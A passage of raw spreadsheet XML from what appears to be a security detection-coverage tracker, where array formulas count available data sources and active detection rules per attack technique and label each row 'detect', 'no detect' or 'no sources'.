        <f t="array" ref="M141">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N141" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O141" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P141" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S14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41" t="s">
        <v>425</v>
      </c>
      <c r="U141" t="s">
        <v>944</v>
      </c>
      <c r="V141" t="s">
        <v>945</v>
      </c>
      <c r="W141" t="b">
        <v>1</v>
      </c>
      <c r="X141" t="s">
        <v>939</v>
      </c>
    </row>
    <row r="142" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A142" t="s">
        <v>939</v>
      </c>
      <c r="B142" t="s">
        <v>946</v>
      </c>
      <c r="C142" t="s">
        <v>296</v>
      </c>
      <c r="D142" t="s">
        <v>11</v>
      </c>
      <c r="E142" t="s">
        <v>940</v>
      </c>
      <c r="F142" s="9">
        <f t="shared" si="2"/>
        <v>2</v>
      </c>
      <c r="G142" s="9" cm="1">
        <f t="array" ref="G142">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>2</v>
      </c>
      <c r="H142" s="9" t="str" cm="1">
        <f t="array" ref="H142">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I142" s="9" t="str" cm="1">
        <f t="array" ref="I142">IF(SUM(IF($C142=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C142=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J142" s="9" t="str" cm="1">
        <f t="array" ref="J14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42" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M142" s="9" cm="1">
        <f t="array" ref="M142">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N142" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O142" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P142" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S14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42" t="s">
        <v>425</v>
      </c>
      <c r="U142" t="s">
        <v>947</v>
      </c>
      <c r="V142" t="s">
        <v>948</v>
      </c>
      <c r="W142" t="b">
        <v>1</v>
      </c>
      <c r="X142" t="s">
        <v>939</v>
      </c>
    </row>
    <row r="143" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A143" t="s">
        <v>939</v>
      </c>
      <c r="B143" t="s">
        <v>949</v>
      </c>
      <c r="C143" t="s">
        <v>295</v>
      </c>
      <c r="D143" t="s">
        <v>11</v>
      </c>
      <c r="E143" t="s">
        <v>940</v>
      </c>
      <c r="F143" s="9">
        <f t="shared" si="2"/>
        <v>2</v>
      </c>
      <c r="G143" s="9" cm="1">
        <f t="array" ref="G143">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>2</v>
      </c>
      <c r="H143" s="9" t="str" cm="1">
        <f t="array" ref="H143">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I143" s="9" t="str" cm="1">
        <f t="array" ref="I143">IF(SUM(IF($C143=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C143=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J143" s="9" t="str" cm="1">
        <f t="array" ref="J14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43" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M143" s="9" cm="1">
        <f t="array" ref="M143">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N143" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O143" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P143" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S14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43" t="s">
        <v>425</v>
      </c>
      <c r="U143" t="s">
        <v>950</v>
      </c>
      <c r="V143" t="s">
        <v>942</v>
      </c>
      <c r="W143" t="b">
        <v>1</v>
      </c>
      <c r="X143" t="s">
        <v>939</v>
      </c>
    </row>
    <row r="144" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A144" t="s">
        <v>939</v>
      </c>
      <c r="B144" t="s">
        <v>951</v>
      </c>
      <c r="C144" t="s">
        <v>324</v>
      </c>
      <c r="D144" t="s">
        <v>11</v>
      </c>
      <c r="E144" t="s">
        <v>940</v>
      </c>
      <c r="F144" s="9">
        <f t="shared" si="2"/>
        <v>2</v>
      </c>
      <c r="G144" s="9" cm="1">
        <f t="array" ref="G144">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>2</v>
      </c>
      <c r="H144" s="9" t="str" cm="1">
        <f t="array" ref="H144">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I144" s="9" t="str" cm="1">
        <f t="array" ref="I144">IF(SUM(IF($C144=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C144=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J144" s="9" t="str" cm="1">
        <f t="array" ref="J14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44" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M144" s="9" cm="1">
        <f t="array" ref="M144">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N144" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O144" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P144" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S14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44" t="s">
        <v>425</v>
      </c>
      <c r="U144" t="s">
        <v>952</v>
      </c>
      <c r="V144" t="s">
        <v>953</v>
      </c>
      <c r="W144" t="b">
        <v>1</v>
      </c>
      <c r="X144" t="s">
        <v>939</v>
      </c>
    </row>
    <row r="145" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A145" t="s">
        <v>939</v>
      </c>
      <c r="B145" t="s">
        <v>954</v>
      </c>
      <c r="C145" t="s">
        <v>955</v>
      </c>
      <c r="D145" t="s">
        <v>11</v>
      </c>
      <c r="E145" t="s">
        <v>940</v>
      </c>
      <c r="F145" s="9">
        <f t="shared" si="2"/>
        <v>2</v>
      </c>
      <c r="G145" s="9" cm="1">
        <f t="array" ref="G145">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>2</v>
      </c>
      <c r="H145" s="9" t="str" cm="1">
        <f t="array" ref="H145">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I145" s="9" t="str" cm="1">
        <f t="array" ref="I145">IF(SUM(IF($C145=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C145=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J145" s="9" t="str" cm="1">
        <f t="array" ref="J14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45" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M145" s="9" cm="1">
        <f t="array" ref="M145">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N145" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O145" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P145" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S14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45" t="s">
        <v>425</v>
      </c>
      <c r="U145" t="s">
        <v>956</v>
      </c>
      <c r="W145" t="b">
        <v>1</v>
      </c>
      <c r="X145" t="s">
        <v>939</v>
      </c>
    </row>
    <row r="146" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A146" t="s">
        <v>957</v>
      </c>
      <c r="B146" t="s">
        <v>957</v>
      </c>
      <c r="C146" t="s">
        <v>97</v>
      </c>
      <c r="D146" t="s">
        <v>958</v>
      </c>
      <c r="E146" t="s">
        <v>959</v>
      </c>
      <c r="F146" s="9">
        <f t="shared" si="2"/>
        <v>2</v>
      </c>
      <c r="G146" s="9" cm="1">
        <f t="array" ref="G146">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H146" s="9" cm="1">
        <f t="array" ref="H146">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I146" s="9" t="str" cm="1">
        <f t="array" ref="I146">IF(SUM(IF($C146=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C146=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J146" s="9" t="str" cm="1">
        <f t="array" ref="J14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46" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M146" s="9" cm="1">
        <f t="array" ref="M146">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N146" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O146" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P146" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S14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46" t="s">
        <v>960</v>
      </c>
      <c r="U146" t="s">
        <v>961</v>
      </c>
      <c r="V146" t="s">
        <v>962</v>
      </c>
      <c r="W146" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="147" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A147" t="s">
        <v>963</v>
      </c>
      <c r="B147" t="s">
        <v>963</v>
      </c>
      <c r="C147" t="s">
        <v>98</v>
      </c>
      <c r="D147" t="s">
        <v>10</v>
      </c>
      <c r="E147" t="s">
        <v>964</v>
      </c>
      <c r="F147" s="9">
        <f t="shared" si="2"/>
        <v>4</v>
      </c>
      <c r="G147" s="9" cm="1">
        <f t="array" ref="G147">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H147" s="9" cm="1">
        <f t="array" ref="H147">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>2</v>
      </c>
      <c r="I147" s="9" t="str" cm="1">
        <f t="array" ref="I147">IF(SUM(IF($C147=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C147=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J147" s="9" cm="1">
        <f t="array" ref="J14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147" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>2</v>
      </c>
      <c r="M147" s="9" cm="1">
        <f t="array" ref="M147">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>2</v>
      </c>
      <c r="N147" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O147" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P147" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S14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47" t="s">
        <v>485</v>
      </c>
      <c r="U147" t="s">
        <v>965</v>
      </c>
      <c r="V147" t="s">
        <v>966</v>
      </c>
      <c r="W147" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="148" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A148" t="s">
        <v>963</v>
      </c>
      <c r="B148" t="s">
        <v>967</v>
      </c>
      <c r="C148" t="s">
        <v>968</v>
      </c>
      <c r="D148" t="s">
        <v>10</v>
      </c>
      <c r="E148" t="s">
        <v>964</v>
      </c>
      <c r="F148" s="9">
        <f t="shared" si="2"/>
        <v>4</v>
      </c>
      <c r="G148" s="9" cm="1">
        <f t="array" ref="G148">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H148" s="9" t="str" cm="1">
        <f t="array" ref="H148">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I148" s="9" t="str" cm="1">
        <f t="array" ref="I148">IF(SUM(IF($C148=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C148=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J148" s="9" t="str" cm="1">
        <f t="array" ref="J14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48" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M148" s="9" cm="1">
        <f t="array" ref="M148">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N148" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O148" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P148" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S14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48" t="s">
        <v>368</v>
      </c>
      <c r="U148" t="s">
        <v>969</v>
      </c>
      <c r="V148" t="s">
        <v>970</v>
      </c>
      <c r="W148" t="b">
        <v>1</v>
      </c>
      <c r="X148" t="s">
        <v>963</v>
      </c>
    </row>
    <row r="149" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A149" t="s">
        <v>963</v>
      </c>
      <c r="B149" t="s">
        <v>971</v>
      </c>
      <c r="C149" t="s">
        <v>972</v>
      </c>
      <c r="D149" t="s">
        <v>10</v>
      </c>
      <c r="E149" t="s">
        <v>973</v>
      </c>
      <c r="F149" s="9">
        <f t="shared" si="2"/>
        <v>3</v>
      </c>
      <c r="G149" s="9" cm="1">
        <f t="array" ref="G149">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H149" s="9" t="str" cm="1">
        <f t="array" ref="H149">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I149" s="9" t="str" cm="1">
        <f t="array" ref="I149">IF(SUM(IF($C149=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C149=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J149" s="9" t="str" cm="1">
        <f t="array" ref="J14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49" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M149" s="9" cm="1">
        <f t="array" ref="M149">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N149" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O149" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P149" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S14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49" t="s">
        <v>485</v>
      </c>
      <c r="U149" t="s">
        <v>974</v>
      </c>
      <c r="V149" t="s">
        <v>975</v>
      </c>
      <c r="W149" t="b">
        <v>1</v>
      </c>
      <c r="X149" t="s">
        <v>963</v>
      </c>
    </row>
    <row r="150" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A150" t="s">
        <v>976</v>
      </c>
      <c r="B150" t="s">
        <v>976</v>
      </c>
      <c r="C150" t="s">
        <v>126</v>
      </c>
      <c r="D150" t="s">
        <v>977</v>
      </c>
      <c r="E150" t="s">
        <v>978</v>
      </c>
      <c r="F150" s="9">
        <f t="shared" si="2"/>
        <v>3</v>
      </c>
      <c r="G150" s="9" cm="1">
        <f t="array" ref="G150">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H150" s="9" cm="1">
        <f t="array" ref="H150">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>4</v>
      </c>
      <c r="I150" s="9" t="str" cm="1">
        <f t="array" ref="I150">IF(SUM(IF($C150=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C150=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J150" s="9" cm="1">
        <f t="array" ref="J15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150" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>4</v>
      </c>
      <c r="M150" s="9" cm="1">
        <f t="array" ref="M150">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>4</v>
      </c>
      <c r="N150" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O150" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P150" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S15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50" t="s">
        <v>979</v>
      </c>
